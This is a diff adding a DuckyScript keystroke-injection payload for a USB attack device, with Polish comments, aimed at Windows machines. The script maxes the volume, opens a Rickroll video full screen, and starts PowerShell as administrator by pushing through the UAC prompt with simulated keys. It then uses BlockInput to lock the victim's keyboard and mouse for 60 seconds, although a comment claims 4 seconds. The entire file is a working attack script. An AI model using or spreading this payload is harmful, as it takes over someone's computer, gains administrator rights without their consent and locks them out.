@@ -1,0 +1,67 @@
+REM /----------------------------------\
+REM|        CODE BY SMOCZEK_BK          |
+REM \----------------------------------/      
+
+DELAY 500
+GUI r
+DELAY 200
+STRING SndVol.exe -f 65535
+DELAY 200
+ENTER
+DELAY 200
+
+UP
+REPEAT 100
+ENTER
+
+DELAY 500
+REM Otwarcie przeglądarki z linkiem do filmu na YouTube
+GUI r
+DELAY 200
+STRING https://youtu.be/dQw4w9WgXcQ?si=u5lPk5mo6zeJhQwt
+DELAY 200
+ENTER
+DELAY 400
+F11
+
+REM Uruchomienie PowerShell jako administrator
+DELAY 200
+GUI
+DELAY 300
+STRING powershell
+DELAY 300
+RIGHT
+DOWN
+ENTER
+DELAY 1000
+
+REM Wykonanie kodu PowerShell do blokowania wejścia użytkownika na 4 sekundy
+LEFT
+DELAY 100
+ENTER
+DELAY 300
+STRING $code = @"
+SHIFT ENTER
+STRING    [DllImport("user32.dll")]
+SHIFT ENTER
+STRING    public static extern bool BlockInput(bool fBlockIt);
+SHIFT ENTER
+STRING "@
+SHIFT ENTER
+SHIFT ENTER
+STRING $userInput = Add-Type -MemberDefinition $code -Name UserInput -Namespace UserInput -PassThru
+SHIFT ENTER
+SHIFT ENTER
+STRING function Disable-UserInput($seconds) {
+SHIFT ENTER
+STRING    $userInput::BlockInput($true)
+SHIFT ENTER
+STRING    Start-Sleep $seconds
+SHIFT ENTER
+STRING    $userInput::BlockInput($false)
+SHIFT ENTER
+STRING }
+SHIFT ENTER
+SHIFT ENTER
+STRING Disable-UserInput -seconds 60 | Out-Null
+ENTER
